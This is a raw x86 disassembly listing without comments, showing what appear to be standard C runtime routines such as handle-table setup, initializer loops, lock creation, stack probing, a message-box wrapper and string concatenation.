  423495:	add    eax,ebp
  423497:	cmp    WORD PTR [eax],bx
  42349a:	jne    0x42348e
  42349c:	mov    edi,DWORD PTR ds:0x428088
  4234a2:	push   ebx
  4234a3:	push   ebx
  4234a4:	push   ebx
  4234a5:	sub    eax,esi
  4234a7:	push   ebx
  4234a8:	sar    eax,1
  4234aa:	inc    eax
  4234ab:	push   eax
  4234ac:	push   esi
  4234ad:	push   ebx
  4234ae:	push   ebx
  4234af:	mov    DWORD PTR [esp+0x34],eax
  4234b3:	call   edi
  4234b5:	mov    ebp,eax
  4234b7:	cmp    ebp,ebx
  4234b9:	je     0x4234ed
  4234bb:	push   ebp
  4234bc:	call   0x424662
  4234c1:	cmp    eax,ebx
  4234c3:	pop    ecx
  4234c4:	mov    DWORD PTR [esp+0x10],eax
  4234c8:	je     0x4234ed
  4234ca:	push   ebx
  4234cb:	push   ebx
  4234cc:	push   ebp
  4234cd:	push   eax
  4234ce:	push   DWORD PTR [esp+0x24]
  4234d2:	push   esi
  4234d3:	push   ebx
  4234d4:	push   ebx
  4234d5:	call   edi
  4234d7:	test   eax,eax
  4234d9:	jne    0x4234e9
  4234db:	push   DWORD PTR [esp+0x10]
  4234df:	call   0x42454a
  4234e4:	pop    ecx
  4234e5:	mov    DWORD PTR [esp+0x10],ebx
  4234e9:	mov    ebx,DWORD PTR [esp+0x10]
  4234ed:	push   esi
  4234ee:	call   DWORD PTR ds:0x428084
  4234f4:	mov    eax,ebx
  4234f6:	jmp    0x423548
  4234f8:	cmp    eax,ebp
  4234fa:	je     0x423504
  4234fc:	cmp    eax,ebx
  4234fe:	je     0x423504
  423500:	xor    eax,eax
  423502:	jmp    0x423548
  423504:	call   DWORD PTR ds:0x428080
  42350a:	mov    esi,eax
  42350c:	cmp    esi,ebx
  42350e:	je     0x423500
  423510:	cmp    BYTE PTR [esi],bl
  423512:	je     0x42351e
  423514:	inc    eax
  423515:	cmp    BYTE PTR [eax],bl
  423517:	jne    0x423514
  423519:	inc    eax
  42351a:	cmp    BYTE PTR [eax],bl
  42351c:	jne    0x423514
  42351e:	sub    eax,esi
  423520:	inc    eax
  423521:	mov    ebp,eax
  423523:	push   ebp
  423524:	call   0x424662
  423529:	mov    edi,eax
  42352b:	cmp    edi,ebx
  42352d:	pop    ecx
  42352e:	jne    0x423534
  423530:	xor    edi,edi
  423532:	jmp    0x42353f
  423534:	push   ebp
  423535:	push   esi
  423536:	push   edi
  423537:	call   0x424680
  42353c:	add    esp,0xc
  42353f:	push   esi
  423540:	call   DWORD PTR ds:0x42807c
  423546:	mov    eax,edi
  423548:	pop    edi
  423549:	pop    esi
  42354a:	pop    ebp
  42354b:	pop    ebx
  42354c:	pop    ecx
  42354d:	pop    ecx
  42354e:	ret    
  42354f:	sub    esp,0x48
  423552:	push   ebx
  423553:	mov    ebx,0x480
  423558:	push   ebx
  423559:	call   0x424662
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	jne    0x42356b
  423563:	or     eax,0xffffffff
  423566:	jmp    0x423748
  42356b:	mov    ds:0x460240,eax
  423570:	mov    DWORD PTR ds:0x460228,0x20
  42357a:	lea    ecx,[eax+0x480]
  423580:	jmp    0x4235a0
  423582:	and    BYTE PTR [eax+0x4],0x0
  423586:	or     DWORD PTR [eax],0xffffffff
  423589:	and    DWORD PTR [eax+0x8],0x0
  42358d:	mov    BYTE PTR [eax+0x5],0xa
  423591:	mov    ecx,DWORD PTR ds:0x460240
  423597:	add    eax,0x24
  42359a:	add    ecx,0x480
  4235a0:	cmp    eax,ecx
  4235a2:	jb     0x423582
  4235a4:	push   ebp
  4235a5:	push   esi
  4235a6:	push   edi
  4235a7:	lea    eax,[esp+0x14]
  4235ab:	push   eax
  4235ac:	call   DWORD PTR ds:0x428058
  4235b2:	cmp    WORD PTR [esp+0x46],0x0
  4235b8:	je     0x4236a7
  4235be:	mov    eax,DWORD PTR [esp+0x48]
  4235c2:	test   eax,eax
  4235c4:	je     0x4236a7
  4235ca:	mov    edi,DWORD PTR [eax]
  4235cc:	lea    ebp,[eax+0x4]
  4235cf:	lea    eax,[edi+ebp*1]
  4235d2:	mov    DWORD PTR [esp+0x10],eax
  4235d6:	mov    eax,0x800
  4235db:	cmp    edi,eax
  4235dd:	jl     0x4235e1
  4235df:	mov    edi,eax
  4235e1:	cmp    DWORD PTR ds:0x460228,edi
  4235e7:	jge    0x423637
  4235e9:	mov    esi,0x460244
  4235ee:	push   ebx
  4235ef:	call   0x424662
  4235f4:	test   eax,eax
  4235f6:	pop    ecx
  4235f7:	je     0x423631
  4235f9:	add    DWORD PTR ds:0x460228,0x20
  423600:	mov    DWORD PTR [esi],eax
  423602:	lea    ecx,[eax+0x480]
  423608:	jmp    0x423620
  42360a:	and    BYTE PTR [eax+0x4],0x0
  42360e:	or     DWORD PTR [eax],0xffffffff
  423611:	and    DWORD PTR [eax+0x8],0x0
  423615:	mov    BYTE PTR [eax+0x5],0xa
  423619:	mov    ecx,DWORD PTR [esi]
  42361b:	add    eax,0x24
  42361e:	add    ecx,ebx
  423620:	cmp    eax,ecx
  423622:	jb     0x42360a
  423624:	add    esi,0x4
  423627:	cmp    DWORD PTR ds:0x460228,edi
  42362d:	jl     0x4235ee
  42362f:	jmp    0x423637
  423631:	mov    edi,DWORD PTR ds:0x460228
  423637:	xor    ebx,ebx
  423639:	test   edi,edi
  42363b:	jle    0x4236a7
  42363d:	mov    eax,DWORD PTR [esp+0x10]
  423641:	mov    eax,DWORD PTR [eax]
  423643:	cmp    eax,0xffffffff
  423646:	je     0x42369c
  423648:	mov    cl,BYTE PTR [ebp+0x0]
  42364b:	test   cl,0x1
  42364e:	je     0x42369c
  423650:	test   cl,0x8
  423653:	jne    0x423660
  423655:	push   eax
  423656:	call   DWORD PTR ds:0x428094
  42365c:	test   eax,eax
  42365e:	je     0x42369c
  423660:	mov    ecx,ebx
  423662:	mov    eax,ebx
  423664:	and    eax,0x1f
  423667:	lea    eax,[eax+eax*8]
  42366a:	sar    ecx,0x5
  42366d:	mov    ecx,DWORD PTR [ecx*4+0x460240]
  423674:	lea    esi,[ecx+eax*4]
  423677:	mov    eax,DWORD PTR [esp+0x10]
  42367b:	mov    eax,DWORD PTR [eax]
  42367d:	mov    DWORD PTR [esi],eax
  42367f:	mov    al,BYTE PTR [ebp+0x0]
  423682:	mov    BYTE PTR [esi+0x4],al
  423685:	lea    eax,[esi+0xc]
  423688:	push   0xfa0
  42368d:	push   eax
  42368e:	call   0x4249cd
  423693:	test   eax,eax
  423695:	pop    ecx
  423696:	pop    ecx
  423697:	je     0x4236c7
  423699:	inc    DWORD PTR [esi+0x8]
  42369c:	add    DWORD PTR [esp+0x10],0x4
  4236a1:	inc    ebx
  4236a2:	inc    ebp
  4236a3:	cmp    ebx,edi
  4236a5:	jl     0x42363d
  4236a7:	xor    ebx,ebx
  4236a9:	mov    ecx,DWORD PTR ds:0x460240
  4236af:	lea    eax,[ebx+ebx*8]
  4236b2:	lea    esi,[ecx+eax*4]
  4236b5:	cmp    DWORD PTR [esi],0xffffffff
  4236b8:	jne    0x423729
  4236ba:	test   ebx,ebx
  4236bc:	mov    BYTE PTR [esi+0x4],0x81
  4236c0:	jne    0x4236cc
  4236c2:	push   0xfffffff6
  4236c4:	pop    eax
  4236c5:	jmp    0x4236d6
  4236c7:	or     eax,0xffffffff
  4236ca:	jmp    0x423745
  4236cc:	mov    eax,ebx
  4236ce:	dec    eax
  4236cf:	neg    eax
  4236d1:	sbb    eax,eax
  4236d3:	add    eax,0xfffffff5
  4236d6:	push   eax
  4236d7:	call   DWORD PTR ds:0x428070
  4236dd:	mov    edi,eax
  4236df:	cmp    edi,0xffffffff
  4236e2:	je     0x423723
  4236e4:	push   edi
  4236e5:	call   DWORD PTR ds:0x428094
  4236eb:	test   eax,eax
  4236ed:	je     0x423723
  4236ef:	and    eax,0xff
  4236f4:	cmp    eax,0x2
  4236f7:	mov    DWORD PTR [esi],edi
  4236f9:	jne    0x423701
  4236fb:	or     BYTE PTR [esi+0x4],0x40
  4236ff:	jmp    0x42370a
  423701:	cmp    eax,0x3
  423704:	jne    0x42370a
  423706:	or     BYTE PTR [esi+0x4],0x8
  42370a:	lea    eax,[esi+0xc]
  42370d:	push   0xfa0
  423712:	push   eax
  423713:	call   0x4249cd
  423718:	test   eax,eax
  42371a:	pop    ecx
  42371b:	pop    ecx
  42371c:	je     0x4236c7
  42371e:	inc    DWORD PTR [esi+0x8]
  423721:	jmp    0x42372d
  423723:	or     BYTE PTR [esi+0x4],0x40
  423727:	jmp    0x42372d
  423729:	or     BYTE PTR [esi+0x4],0x80
  42372d:	inc    ebx
  42372e:	cmp    ebx,0x3
  423731:	jl     0x4236a9
  423737:	push   DWORD PTR ds:0x460228
  42373d:	call   DWORD PTR ds:0x428090
  423743:	xor    eax,eax
  423745:	pop    edi
  423746:	pop    esi
  423747:	pop    ebp
  423748:	pop    ebx
  423749:	add    esp,0x48
  42374c:	ret    
  42374d:	push   0xc
  42374f:	push   0x4284e0
  423754:	call   0x423940
  423759:	mov    DWORD PTR [ebp-0x1c],0x428f38
  423760:	cmp    DWORD PTR [ebp-0x1c],0x428f38
  423767:	jae    0x42378b
  423769:	and    DWORD PTR [ebp-0x4],0x0
  42376d:	mov    eax,DWORD PTR [ebp-0x1c]
  423770:	mov    eax,DWORD PTR [eax]
  423772:	test   eax,eax
  423774:	je     0x423781
  423776:	call   eax
  423778:	jmp    0x423781
  42377a:	xor    eax,eax
  42377c:	inc    eax
  42377d:	ret    
  42377e:	mov    esp,DWORD PTR [ebp-0x18]
  423781:	or     DWORD PTR [ebp-0x4],0xffffffff
  423785:	add    DWORD PTR [ebp-0x1c],0x4
  423789:	jmp    0x423760
  42378b:	call   0x42397b
  423790:	ret    
  423791:	push   0xc
  423793:	push   0x4284f0
  423798:	call   0x423940
  42379d:	mov    DWORD PTR [ebp-0x1c],0x428f40
  4237a4:	cmp    DWORD PTR [ebp-0x1c],0x428f40
  4237ab:	jae    0x4237cf
  4237ad:	and    DWORD PTR [ebp-0x4],0x0
  4237b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4237b4:	mov    eax,DWORD PTR [eax]
  4237b6:	test   eax,eax
  4237b8:	je     0x4237c5
  4237ba:	call   eax
  4237bc:	jmp    0x4237c5
  4237be:	xor    eax,eax
  4237c0:	inc    eax
  4237c1:	ret    
  4237c2:	mov    esp,DWORD PTR [ebp-0x18]
  4237c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4237c9:	add    DWORD PTR [ebp-0x1c],0x4
  4237cd:	jmp    0x4237a4
  4237cf:	call   0x42397b
  4237d4:	ret    
  4237d5:	call   0x423a16
  4237da:	mov    eax,ds:0x45f3dc
  4237df:	cmp    eax,0xffffffff
  4237e2:	je     0x4237f2
  4237e4:	push   eax
  4237e5:	call   DWORD PTR ds:0x42809c
  4237eb:	or     DWORD PTR ds:0x45f3dc,0xffffffff
  4237f2:	ret    
  4237f3:	push   ebx
  4237f4:	push   esi
  4237f5:	call   DWORD PTR ds:0x428018
  4237fb:	push   DWORD PTR ds:0x45f3dc
  423801:	mov    ebx,eax
  423803:	call   DWORD PTR ds:0x4280ac
  423809:	mov    esi,eax
  42380b:	test   esi,esi
  42380d:	jne    0x423858
  42380f:	push   0x88
  423814:	push   0x1
  423816:	call   0x424a58
  42381b:	mov    esi,eax
  42381d:	test   esi,esi
  42381f:	pop    ecx
  423820:	pop    ecx
  423821:	je     0x423850
  423823:	push   esi
  423824:	push   DWORD PTR ds:0x45f3dc
  42382a:	call   DWORD PTR ds:0x4280a8
  423830:	test   eax,eax
  423832:	je     0x423850
  423834:	mov    DWORD PTR [esi+0x54],0x45f330
  42383b:	mov    DWORD PTR [esi+0x14],0x1
  423842:	call   DWORD PTR ds:0x4280a4
  423848:	or     DWORD PTR [esi+0x4],0xffffffff
  42384c:	mov    DWORD PTR [esi],eax
  42384e:	jmp    0x423858
  423850:	push   0x10
  423852:	call   0x422a06
  423857:	pop    ecx
  423858:	push   ebx
  423859:	call   DWORD PTR ds:0x4280a0
  42385f:	mov    eax,esi
  423861:	pop    esi
  423862:	pop    ebx
  423863:	ret    
  423864:	call   0x4239cd
  423869:	test   eax,eax
  42386b:	je     0x42387d
  42386d:	call   DWORD PTR ds:0x4280b0
  423873:	cmp    eax,0xffffffff
  423876:	mov    ds:0x45f3dc,eax
  42387b:	jne    0x423885
  42387d:	call   0x4237d5
  423882:	xor    eax,eax
  423884:	ret    
  423885:	push   esi
  423886:	push   0x88
  42388b:	push   0x1
  42388d:	call   0x424a58
  423892:	mov    esi,eax
  423894:	test   esi,esi
  423896:	pop    ecx
  423897:	pop    ecx
  423898:	je     0x4238ca
  42389a:	push   esi
  42389b:	push   DWORD PTR ds:0x45f3dc
  4238a1:	call   DWORD PTR ds:0x4280a8
  4238a7:	test   eax,eax
  4238a9:	je     0x4238ca
  4238ab:	mov    DWORD PTR [esi+0x54],0x45f330
  4238b2:	mov    DWORD PTR [esi+0x14],0x1
  4238b9:	call   DWORD PTR ds:0x4280a4
  4238bf:	or     DWORD PTR [esi+0x4],0xffffffff
  4238c3:	mov    DWORD PTR [esi],eax
  4238c5:	xor    eax,eax
  4238c7:	inc    eax
  4238c8:	pop    esi
  4238c9:	ret    
  4238ca:	call   0x4237d5
  4238cf:	xor    eax,eax
  4238d1:	pop    esi
  4238d2:	ret    
  4238d3:	cmp    DWORD PTR ds:0x45fba4,0x2
  4238da:	jne    0x4238e9
  4238dc:	cmp    DWORD PTR ds:0x45fbb0,0x5
  4238e3:	jb     0x4238e9
  4238e5:	xor    eax,eax
  4238e7:	inc    eax
  4238e8:	ret    
  4238e9:	push   0x3
  4238eb:	pop    eax
  4238ec:	ret    
  4238ed:	xor    eax,eax
  4238ef:	cmp    DWORD PTR [esp+0x4],eax
  4238f3:	push   0x0
  4238f5:	sete   al
  4238f8:	push   0x1000
  4238fd:	push   eax
  4238fe:	call   DWORD PTR ds:0x4280b8
  423904:	test   eax,eax
  423906:	mov    ds:0x460220,eax
  42390b:	je     0x423937
  42390d:	call   0x4238d3
  423912:	cmp    eax,0x3
  423915:	mov    ds:0x460224,eax
  42391a:	jne    0x42393a
  42391c:	push   0x3f8
  423921:	call   0x424cda
  423926:	test   eax,eax
  423928:	pop    ecx
  423929:	jne    0x42393a
  42392b:	push   DWORD PTR ds:0x460220
  423931:	call   DWORD PTR ds:0x4280b4
  423937:	xor    eax,eax
  423939:	ret    
  42393a:	xor    eax,eax
  42393c:	inc    eax
  42393d:	ret    
  42393e:	int3   
  42393f:	int3   
  423940:	push   0x425808
  423945:	mov    eax,fs:0x0
  42394b:	push   eax
  42394c:	mov    eax,DWORD PTR [esp+0x10]
  423950:	mov    DWORD PTR [esp+0x10],ebp
  423954:	lea    ebp,[esp+0x10]
  423958:	sub    esp,eax
  42395a:	push   ebx
  42395b:	push   esi
  42395c:	push   edi
  42395d:	mov    eax,DWORD PTR [ebp-0x8]
  423960:	mov    DWORD PTR [ebp-0x18],esp
  423963:	push   eax
  423964:	mov    eax,DWORD PTR [ebp-0x4]
  423967:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42396e:	mov    DWORD PTR [ebp-0x8],eax
  423971:	lea    eax,[ebp-0x10]
  423974:	mov    fs:0x0,eax
  42397a:	ret    
  42397b:	mov    ecx,DWORD PTR [ebp-0x10]
  42397e:	mov    DWORD PTR fs:0x0,ecx
  423985:	pop    ecx
  423986:	pop    edi
  423987:	pop    esi
  423988:	pop    ebx
  423989:	leave  
  42398a:	push   ecx
  42398b:	ret    
  42398c:	int3   
  42398d:	int3   
  42398e:	int3   
  42398f:	int3   
  423990:	cmp    eax,0x1000
  423995:	jae    0x4239a5
  423997:	neg    eax
  423999:	add    eax,esp
  42399b:	add    eax,0x4
  42399e:	test   DWORD PTR [eax],eax
  4239a0:	xchg   esp,eax
  4239a1:	mov    eax,DWORD PTR [eax]
  4239a3:	push   eax
  4239a4:	ret    
  4239a5:	push   ecx
  4239a6:	lea    ecx,[esp+0x8]
  4239aa:	sub    ecx,0x1000
  4239b0:	sub    eax,0x1000
  4239b5:	test   DWORD PTR [ecx],eax
  4239b7:	cmp    eax,0x1000
  4239bc:	jae    0x4239aa
  4239be:	sub    ecx,eax
  4239c0:	mov    eax,esp
  4239c2:	test   DWORD PTR [ecx],eax
  4239c4:	mov    esp,ecx
  4239c6:	mov    ecx,DWORD PTR [eax]
  4239c8:	mov    eax,DWORD PTR [eax+0x4]
  4239cb:	push   eax
  4239cc:	ret    
  4239cd:	push   esi
  4239ce:	push   edi
  4239cf:	xor    esi,esi
  4239d1:	mov    edi,0x45fd00
  4239d6:	cmp    DWORD PTR [esi*8+0x45f3f4],0x1
  4239de:	jne    0x4239fe
  4239e0:	lea    eax,[esi*8+0x45f3f0]
  4239e7:	mov    DWORD PTR [eax],edi
  4239e9:	push   0xfa0
  4239ee:	push   DWORD PTR [eax]
  4239f0:	add    edi,0x18
  4239f3:	call   0x4249cd
  4239f8:	test   eax,eax
  4239fa:	pop    ecx
  4239fb:	pop    ecx
  4239fc:	je     0x423a0a
  4239fe:	inc    esi
  4239ff:	cmp    esi,0x24
  423a02:	jl     0x4239d6
  423a04:	xor    eax,eax
  423a06:	inc    eax
  423a07:	pop    edi
  423a08:	pop    esi
  423a09:	ret    
  423a0a:	and    DWORD PTR [esi*8+0x45f3f0],0x0
  423a12:	xor    eax,eax
  423a14:	jmp    0x423a07
  423a16:	push   ebx
  423a17:	mov    ebx,DWORD PTR ds:0x428098
  423a1d:	push   esi
  423a1e:	mov    esi,0x45f3f0
  423a23:	push   edi
  423a24:	mov    edi,DWORD PTR [esi]
  423a26:	test   edi,edi
  423a28:	je     0x423a3d
  423a2a:	cmp    DWORD PTR [esi+0x4],0x1
  423a2e:	je     0x423a3d
  423a30:	push   edi
  423a31:	call   ebx
  423a33:	push   edi
  423a34:	call   0x42454a
  423a39:	and    DWORD PTR [esi],0x0
  423a3c:	pop    ecx
  423a3d:	add    esi,0x8
  423a40:	cmp    esi,0x45f510
  423a46:	jl     0x423a24
  423a48:	mov    esi,0x45f3f0
  423a4d:	pop    edi
  423a4e:	mov    eax,DWORD PTR [esi]
  423a50:	test   eax,eax
  423a52:	je     0x423a5d
  423a54:	cmp    DWORD PTR [esi+0x4],0x1
  423a58:	jne    0x423a5d
  423a5a:	push   eax
  423a5b:	call   ebx
  423a5d:	add    esi,0x8
  423a60:	cmp    esi,0x45f510
  423a66:	jl     0x423a4e
  423a68:	pop    esi
  423a69:	pop    ebx
  423a6a:	ret    
  423a6b:	push   ebp
  423a6c:	mov    ebp,esp
  423a6e:	mov    eax,DWORD PTR [ebp+0x8]
  423a71:	push   DWORD PTR [eax*8+0x45f3f0]
  423a78:	call   DWORD PTR ds:0x428020
  423a7e:	pop    ebp
  423a7f:	ret    
  423a80:	push   ebp
  423a81:	mov    ebp,esp
  423a83:	push   esi
  423a84:	mov    esi,DWORD PTR [ebp+0x8]
  423a87:	lea    esi,[esi*8+0x45f3f0]
  423a8e:	cmp    DWORD PTR [esi],0x0
  423a91:	je     0x423a98
  423a93:	xor    eax,eax
  423a95:	inc    eax
  423a96:	jmp    0x423afc
  423a98:	push   edi
  423a99:	push   0x18
  423a9b:	call   0x424662
  423aa0:	mov    edi,eax
  423aa2:	test   edi,edi
  423aa4:	pop    ecx
  423aa5:	jne    0x423ab6
  423aa7:	call   0x4258e0
  423aac:	mov    DWORD PTR [eax],0xc
  423ab2:	xor    eax,eax
  423ab4:	jmp    0x423afb
  423ab6:	push   0xa
  423ab8:	call   0x423aff
  423abd:	cmp    DWORD PTR [esi],0x0
  423ac0:	pop    ecx
  423ac1:	jne    0x423ae9
  423ac3:	push   0xfa0
  423ac8:	push   edi
  423ac9:	call   0x4249cd
  423ace:	test   eax,eax
  423ad0:	pop    ecx
  423ad1:	pop    ecx
  423ad2:	jne    0x423ae5
  423ad4:	push   edi
  423ad5:	call   0x42454a
  423ada:	push   0xa
  423adc:	call   0x423a6b
  423ae1:	pop    ecx
  423ae2:	pop    ecx
  423ae3:	jmp    0x423aa7
  423ae5:	mov    DWORD PTR [esi],edi
  423ae7:	jmp    0x423af0
  423ae9:	push   edi
  423aea:	call   0x42454a
  423aef:	pop    ecx
  423af0:	push   0xa
  423af2:	call   0x423a6b
  423af7:	xor    eax,eax
  423af9:	pop    ecx
  423afa:	inc    eax
  423afb:	pop    edi
  423afc:	pop    esi
  423afd:	pop    ebp
  423afe:	ret    
  423aff:	push   ebp
  423b00:	mov    ebp,esp
  423b02:	mov    eax,DWORD PTR [ebp+0x8]
  423b05:	push   esi
  423b06:	lea    esi,[eax*8+0x45f3f0]
  423b0d:	cmp    DWORD PTR [esi],0x0
  423b10:	jne    0x423b25
  423b12:	push   eax
  423b13:	call   0x423a80
  423b18:	test   eax,eax
  423b1a:	pop    ecx
  423b1b:	jne    0x423b25
  423b1d:	push   0x11
  423b1f:	call   0x422a06
  423b24:	pop    ecx
  423b25:	push   DWORD PTR [esi]
  423b27:	call   DWORD PTR ds:0x4280c4
  423b2d:	pop    esi
  423b2e:	pop    ebp
  423b2f:	ret    
  423b30:	push   esi
  423b31:	push   DWORD PTR ds:0x460348
  423b37:	call   0x425a96
  423b3c:	pop    ecx
  423b3d:	mov    ecx,DWORD PTR ds:0x460344
  423b43:	mov    esi,eax
  423b45:	mov    eax,ds:0x460348
  423b4a:	mov    edx,ecx
  423b4c:	sub    edx,eax
  423b4e:	add    edx,0x4
  423b51:	cmp    esi,edx
  423b53:	jae    0x423ba3
  423b55:	mov    ecx,0x800
  423b5a:	cmp    esi,ecx
  423b5c:	jae    0x423b60
  423b5e:	mov    ecx,esi
  423b60:	add    ecx,esi
  423b62:	push   ecx
  423b63:	push   eax
  423b64:	call   0x4258e9
  423b69:	test   eax,eax
  423b6b:	pop    ecx
  423b6c:	pop    ecx
  423b6d:	jne    0x423b86
  423b6f:	add    esi,0x10
  423b72:	push   esi
  423b73:	push   DWORD PTR ds:0x460348
  423b79:	call   0x4258e9
  423b7e:	test   eax,eax
  423b80:	pop    ecx
  423b81:	pop    ecx
  423b82:	jne    0x423b86
  423b84:	pop    esi
  423b85:	ret    
  423b86:	mov    ecx,DWORD PTR ds:0x460344
  423b8c:	sub    ecx,DWORD PTR ds:0x460348
  423b92:	mov    ds:0x460348,eax
  423b97:	sar    ecx,0x2
  423b9a:	lea    ecx,[eax+ecx*4]
  423b9d:	mov    DWORD PTR ds:0x460344,ecx
  423ba3:	mov    DWORD PTR [ecx],edi
  423ba5:	add    DWORD PTR ds:0x460344,0x4
  423bac:	mov    eax,edi
  423bae:	pop    esi
  423baf:	ret    
  423bb0:	push   0x80
  423bb5:	call   0x424662
  423bba:	test   eax,eax
  423bbc:	pop    ecx
  423bbd:	mov    ds:0x460348,eax
  423bc2:	jne    0x423bc8
  423bc4:	push   0x18
  423bc6:	pop    eax
  423bc7:	ret    
  423bc8:	and    DWORD PTR [eax],0x0
  423bcb:	mov    eax,ds:0x460348
  423bd0:	mov    ds:0x460344,eax
  423bd5:	xor    eax,eax
  423bd7:	ret    
  423bd8:	push   0xc
  423bda:	push   0x428500
  423bdf:	call   0x423940
  423be4:	call   0x422c51
  423be9:	and    DWORD PTR [ebp-0x4],0x0
  423bed:	mov    edi,DWORD PTR [ebp+0x8]
  423bf0:	call   0x423b30
  423bf5:	mov    DWORD PTR [ebp-0x1c],eax
  423bf8:	or     DWORD PTR [ebp-0x4],0xffffffff
  423bfc:	call   0x423c0a
  423c01:	mov    eax,DWORD PTR [ebp-0x1c]
  423c04:	call   0x42397b
  423c09:	ret    
  423c0a:	call   0x422c5a
  423c0f:	ret    
  423c10:	push   DWORD PTR [esp+0x4]
  423c14:	call   0x423bd8
  423c19:	neg    eax
  423c1b:	sbb    eax,eax
  423c1d:	neg    eax
  423c1f:	pop    ecx
  423c20:	dec    eax
  423c21:	ret    
  423c22:	push   ebp
  423c23:	mov    ebp,esp
  423c25:	sub    esp,0x10
  423c28:	push   ebx
  423c29:	xor    ebx,ebx
  423c2b:	cmp    DWORD PTR ds:0x45fe50,ebx
  423c31:	push   esi
  423c32:	push   edi
  423c33:	jne    0x423ca2
  423c35:	push   0x428570
  423c3a:	call   DWORD PTR ds:0x4280c8
  423c40:	mov    edi,eax
  423c42:	cmp    edi,ebx
  423c44:	je     0x423cdd
  423c4a:	mov    esi,DWORD PTR ds:0x428010
  423c50:	push   0x428564
  423c55:	push   edi
  423c56:	call   esi
  423c58:	test   eax,eax
  423c5a:	mov    ds:0x45fe50,eax
  423c5f:	je     0x423cdd
  423c61:	push   0x428554
  423c66:	push   edi
  423c67:	call   esi
  423c69:	push   0x428540
  423c6e:	push   edi
  423c6f:	mov    ds:0x45fe54,eax
  423c74:	call   esi
  423c76:	cmp    DWORD PTR ds:0x45fba4,0x2
  423c7d:	mov    ds:0x45fe58,eax
  423c82:	jne    0x423ca2
  423c84:	push   0x428524
  423c89:	push   edi
  423c8a:	call   esi
  423c8c:	test   eax,eax
  423c8e:	mov    ds:0x45fe60,eax
  423c93:	je     0x423ca2
  423c95:	push   0x42850c
  423c9a:	push   edi
  423c9b:	call   esi
  423c9d:	mov    ds:0x45fe5c,eax
  423ca2:	mov    eax,ds:0x45fe5c
  423ca7:	test   eax,eax
  423ca9:	je     0x423ce7
  423cab:	call   eax
  423cad:	test   eax,eax
  423caf:	je     0x423cce
  423cb1:	lea    ecx,[ebp-0x4]
  423cb4:	push   ecx
  423cb5:	push   0xc
  423cb7:	lea    ecx,[ebp-0x10]
  423cba:	push   ecx
  423cbb:	push   0x1
  423cbd:	push   eax
  423cbe:	call   DWORD PTR ds:0x45fe60
  423cc4:	test   eax,eax
  423cc6:	je     0x423cce
  423cc8:	test   BYTE PTR [ebp-0x8],0x1
  423ccc:	jne    0x423ce7
  423cce:	cmp    DWORD PTR ds:0x45fbb0,0x4
  423cd5:	jb     0x423ce1
  423cd7:	or     BYTE PTR [ebp+0x12],0x20
  423cdb:	jmp    0x423d06
  423cdd:	xor    eax,eax
  423cdf:	jmp    0x423d16
  423ce1:	or     BYTE PTR [ebp+0x12],0x4
  423ce5:	jmp    0x423d06
  423ce7:	mov    eax,ds:0x45fe54
  423cec:	test   eax,eax
  423cee:	je     0x423d06
  423cf0:	call   eax
  423cf2:	mov    ebx,eax
  423cf4:	test   ebx,ebx
  423cf6:	je     0x423d06
  423cf8:	mov    eax,ds:0x45fe58
  423cfd:	test   eax,eax
  423cff:	je     0x423d06
  423d01:	push   ebx
  423d02:	call   eax
  423d04:	mov    ebx,eax
  423d06:	push   DWORD PTR [ebp+0x10]
  423d09:	push   DWORD PTR [ebp+0xc]
  423d0c:	push   DWORD PTR [ebp+0x8]
  423d0f:	push   ebx
  423d10:	call   DWORD PTR ds:0x45fe50
  423d16:	pop    edi
  423d17:	pop    esi
  423d18:	pop    ebx
  423d19:	leave  
  423d1a:	ret    
  423d1b:	int3   
  423d1c:	int3   
  423d1d:	int3   
  423d1e:	int3   
  423d1f:	int3   
  423d20:	push   edi
  423d21:	mov    edi,DWORD PTR [esp+0x8]
  423d25:	jmp    0x423d95
  423d27:	lea    esp,[esp+0x0]
  423d2e:	mov    edi,edi
  423d30:	mov    ecx,DWORD PTR [esp+0x4]
  423d34:	push   edi
  423d35:	test   ecx,0x3
  423d3b:	je     0x423d50
  423d3d:	mov    al,BYTE PTR [ecx]
  423d3f:	add    ecx,0x1
  423d42:	test   al,al
  423d44:	je     0x423d83
  423d46:	test   ecx,0x3
  423d4c:	jne    0x423d3d
  423d4e:	mov    edi,edi
  423d50:	mov    eax,DWORD PTR [ecx]
  423d52:	mov    edx,0x7efefeff
  423d57:	add    edx,eax
  423d59:	xor    eax,0xffffffff
  423d5c:	xor    eax,edx
  423d5e:	add    ecx,0x4
  423d61:	test   eax,0x81010100
  423d66:	je     0x423d50
  423d68:	mov    eax,DWORD PTR [ecx-0x4]
  423d6b:	test   al,al
  423d6d:	je     0x423d92
  423d6f:	test   ah,ah
  423d71:	je     0x423d8d
  423d73:	test   eax,0xff0000
  423d78:	je     0x423d88
  423d7a:	test   eax,0xff000000
  423d7f:	je     0x423d83
  423d81:	jmp    0x423d50
  423d83:	lea    edi,[ecx-0x1]
  423d86:	jmp    0x423d95
  423d88:	lea    edi,[ecx-0x2]
  423d8b:	jmp    0x423d95
  423d8d:	lea    edi,[ecx-0x3]
  423d90:	jmp    0x423d95
  423d92:	lea    edi,[ecx-0x4]
  423d95:	mov    ecx,DWORD PTR [esp+0xc]
  423d99:	test   ecx,0x3
  423d9f:	je     0x423dbe
  423da1:	mov    dl,BYTE PTR [ecx]
  423da3:	add    ecx,0x1
  423da6:	test   dl,dl
  423da8:	je     0x423e10
  423daa:	mov    BYTE PTR [edi],dl
  423dac:	add    edi,0x1
  423daf:	test   ecx,0x3
  423db5:	jne    0x423da1
  423db7:	jmp    0x423dbe
  423db9:	mov    DWORD PTR [edi],edx
  423dbb:	add    edi,0x4
  423dbe:	mov    edx,0x7efefeff
  423dc3:	mov    eax,DWORD PTR [ecx]
  423dc5:	add    edx,eax
  423dc7:	xor    eax,0xffffffff
  423dca:	xor    eax,edx
  423dcc:	mov    edx,DWORD PTR [ecx]
  423dce:	add    ecx,0x4
  423dd1:	test   eax,0x81010100
  423dd6:	je     0x423db9
  423dd8:	test   dl,dl
  423dda:	je     0x423e10
  423ddc:	test   dh,dh
  423dde:	je     0x423e07
  423de0:	test   edx,0xff0000
  423de6:	je     0x423dfa
  423de8:	test   edx,0xff000000
  423dee:	je     0x423df2
  423df0:	jmp    0x423db9
  423df2:	mov    DWORD PTR [edi],edx
  423df4:	mov    eax,DWORD PTR [esp+0x8]
  423df8:	pop    edi
  423df9:	ret    
